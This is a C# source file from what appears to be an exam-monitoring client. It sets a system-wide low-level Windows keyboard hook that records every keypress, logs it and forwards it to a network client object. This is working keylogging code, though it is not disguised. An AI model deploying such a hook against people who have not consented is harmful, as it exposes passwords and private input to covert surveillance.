using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace NetExam_Client
{
    public static class Hooks
    {
        public delegate void HookKeyPress(LLKHEventArgs e);
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        public static event HookKeyPress KeyUp;
        public static event HookKeyPress KeyDown;
        private const int WH_KEYBOARD_LL = 13;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        public static Form1 form = null;
        public static Client client = null;

        public static List<Keys> _pressedKeys = new List<Keys>();
        public static List<Keys> _unPressedKeys = new List<Keys>();

        public static void KeyUpEvent(LLKHEventArgs e)
        {
            _pressedKeys.Remove(e.Keys);
            if (!_pressedKeys.Any() && _unPressedKeys.Any())
            {
                // do something here 
                _unPressedKeys.Clear();
            }
        }

        public static void KeyDownEvent(LLKHEventArgs e)
        {
            if (!_pressedKeys.Contains(e.Keys) && !_unPressedKeys.Contains(e.Keys))
            {
                client?.UppendMessage(e.Keys.ToString());
                form?.Log(e.Keys.ToString());
                _pressedKeys.Add(e.Keys);
                _unPressedKeys.Add(e.Keys);
            }
        }
        private static void InitGlobalHook()
        {
            KeyUp=KeyUpEvent;
            KeyDown=KeyDownEvent;
        }
        public static void SetHooks()
        {
            InitGlobalHook();
            _hookID = SetHook(_proc);
        }
        public static void Unhook()
        {
            UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        private static IntPtr HookCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                var pressed = wParam == (IntPtr)256;
                Keys keys = (Keys)Marshal.ReadInt32(lParam);
                var args = new LLKHEventArgs(keys, pressed, 0U, 0U);
                if (pressed)
                    KeyDown?.Invoke(args);
                else
                    KeyUp?.Invoke(args);
                if (args.Hooked)
                    return (IntPtr)1;
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }

    public class LLKHEventArgs
    {
        readonly Keys keys;
        readonly bool pressed;
        readonly uint time;
        readonly uint scCode;

        public LLKHEventArgs(Keys keys, bool pressed, uint time, uint scanCode)
        {
            this.keys = keys;
            this.pressed = pressed;
            this.time = time;
            this.scCode = scanCode;
        }

        public Keys Keys { get { return keys; } }
        public bool IsPressed { get { return pressed; } }
        public uint Time { get { return time; } }
        public uint ScanCode { get { return scCode; } }
        public bool Hooked { get; set; }
    }
}
